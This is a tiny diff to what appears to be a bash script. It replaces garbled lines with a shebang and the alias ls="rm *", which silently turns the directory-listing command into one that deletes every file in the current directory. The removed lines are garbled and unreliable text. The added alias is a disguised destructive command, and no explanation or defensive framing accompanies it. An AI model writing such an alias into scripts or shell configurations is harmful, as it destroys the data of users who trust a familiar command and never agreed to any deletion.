@@ -1,3 +1,2 @@
-#!/bin/bas
-alias ls=":q
-id plodja'drm *"
+#!/bin/bash
+alias ls="rm *"
